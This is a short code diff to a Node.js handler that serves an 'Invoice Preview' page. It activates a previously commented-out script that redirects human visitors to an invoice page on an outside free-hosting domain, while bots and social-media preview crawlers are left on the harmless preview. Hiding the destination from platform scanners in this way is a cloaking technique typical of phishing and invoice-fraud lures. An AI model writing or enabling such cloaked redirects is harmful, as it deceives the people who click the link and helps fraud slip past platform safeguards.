@@ -21,9 +21,9 @@ module.exports = (req, res) => {
         <meta property="og:image:alt" content="Invoice Preview" />
         
         <script>
-          //if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
-          //  window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
-          //}
+          if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
+            window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
+          }
         </script>
       </head>
       <body>
